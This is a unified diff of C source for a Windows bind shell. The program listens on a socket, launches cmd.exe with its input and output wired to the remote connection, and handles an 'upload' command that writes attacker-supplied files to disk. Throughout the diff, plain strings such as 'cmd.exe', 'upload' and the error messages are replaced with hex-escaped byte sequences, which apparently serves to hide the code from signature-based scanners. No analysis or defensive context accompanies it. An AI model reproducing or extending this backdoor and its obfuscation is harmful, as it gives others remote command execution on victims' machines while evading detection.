@@ -49,7 +49,7 @@ int main() //the main function
     if (bind(locsock, (SOCKADDR*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
     {
         WSACleanup();
-        printf("Error binding socket.\n");
+        printf("\x45\x72\x72\x6f\x72\x20\x62\x69\x6e\x64\x69\x6e\x67\x20\x73\x6f\x63\x6b\x65\x74\x2e\x0a");
         return EXIT_FAILURE;
     }
 
@@ -57,7 +57,7 @@ int main() //the main function
     if (listen(locsock, 5) == SOCKET_ERROR)
     {
         WSACleanup();
-        printf("Error listening socket.\n");
+        printf("\x45\x72\x72\x6f\x72\x20\x6c\x69\x73\x74\x65\x6e\x69\x6e\x67\x20\x73\x6f\x63\x6b\x65\x74\x2e\x0a");
         return EXIT_FAILURE;
     }
 
@@ -73,7 +73,7 @@ int main() //the main function
             {
                 //cleanup and exit program
                 WSACleanup();
-                printf("Error accepting socket.");
+                printf("\x45\x72\x72\x6f\x72\x20\x61\x63\x63\x65\x70\x74\x69\x6e\x67\x20\x73\x6f\x63\x6b\x65\x74\x2e");
                 return EXIT_FAILURE;
             }
 
@@ -108,11 +108,11 @@ void CommandPrompt(void) //the function which handles the complete commandprompt
     startinfo.hStdError = newstdout;
     startinfo.hStdInput = newstdin;
 
-    wchar_t cmd[] = L"cmd.exe"; //the command we want to start
+    wchar_t cmd[] = L"\x63\x6d\x64\x2e\x65\x78\x65"; //the command we want to start
 
     //start cmd prompt
     if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo)) {
-        printf("CreateProcess failed (%d).\n", GetLastError());
+        printf("\x43\x72\x65\x61\x74\x65\x50\x72\x6f\x63\x65\x73\x73\x20\x66\x61\x69\x6c\x65\x64\x20\x28\x25\x64\x29\x2e\x0a", GetLastError());
         return;
     }
 
@@ -151,7 +151,7 @@ void CommandPrompt(void) //the function which handles the complete commandprompt
         //receive the command given
         recv(remsock, bufferin, sizeof(bufferin), 0);
 
-        if (strncmp(bufferin, "upload", 6) == 0) {
+        if (strncmp(bufferin, "\x75\x70\x6c\x6f\x61\x64", 6) == 0) {
             handle_upload(remsock);
             continue;
         }
@@ -198,39 +198,39 @@ closeup:
 }
 
 void handle_upload(SOCKET sock) {
-    char filename[256];
+    char name[256];
     int received;
     FILE* fp;
 
     // Clear the buffer and receive the filename
     ZeroMemory(bufferin, sizeof(bufferin));
-    if (recv(sock, filename, sizeof(filename), 0) <= 0) {
-        send(sock, "Error receiving filename\n", strlen("Error receiving filename\n"), 0);
+    if (recv(sock, name, sizeof(name), 0) <= 0) {
+        send(sock, "\x45\x72\x72\x6f\x72\x20\x72\x65\x63\x65\x69\x76\x69\x6e\x67\x20\x66\x69\x6c\x65\x6e\x61\x6d\x65\x0a", strlen("\x45\x72\x72\x6f\x72\x20\x72\x65\x63\x65\x69\x76\x69\x6e\x67\x20\x66\x69\x6c\x65\x6e\x61\x6d\x65\x0a"), 0);
         return;
     }
 
     // Remove newline character if present
-    char* newline = strchr(filename, '\n');
+    char* newline = strchr(name, '\n');
     if (newline) {
         *newline = '\0';
     }
     // Open the file for writing
-    fp = fopen(filename, "w");
+    fp = fopen(name, "w");
     if (fp == NULL) {
-        send(sock, "Error opening file for writing\n", strlen("Error opening file for writing\n"), 0);
+        send(sock, "\x45\x72\x72\x6f\x72\x20\x6f\x70\x65\x6e\x69\x6e\x67\x20\x66\x69\x6c\x65\x20\x66\x6f\x72\x20\x77\x72\x69\x74\x69\x6e\x67\x0a", strlen("\x45\x72\x72\x6f\x72\x20\x6f\x70\x65\x6e\x69\x6e\x67\x20\x66\x69\x6c\x65\x20\x66\x6f\x72\x20\x77\x72\x69\x74\x69\x6e\x67\x0a"), 0);
         return;
     }
-    send(sock, "File created\n", strlen("File created\n"), 0);
+    send(sock, "\x46\x69\x6c\x65\x20\x63\x72\x65\x61\x74\x65\x64\x0a", strlen("\x46\x69\x6c\x65\x20\x63\x72\x65\x61\x74\x65\x64\x0a"), 0);
 
     // Receive the file content
-    char stop[] = "stop upload";
+    char stop[] = "\x73\x74\x6f\x70\x20\x75\x70\x6c\x6f\x61\x64";
     while ((received = recv(sock, bufferin, sizeof(bufferin), 0)) > 0) {
-        if (strstr(bufferin, "stop upload") != NULL) {
+        if (strstr(bufferin, "\x73\x74\x6f\x70\x20\x75\x70\x6c\x6f\x61\x64") != NULL) {
             break;
         }
         fwrite(bufferin, 1, received, fp);
     }
     fclose(fp);
 
-    send(sock, "File received successfully\n", strlen("File received successfully\n"), 0);
+    send(sock, "\x46\x69\x6c\x65\x20\x72\x65\x63\x65\x69\x76\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x0a", strlen("\x46\x69\x6c\x65\x20\x72\x65\x63\x65\x69\x76\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x0a"), 0);
 }
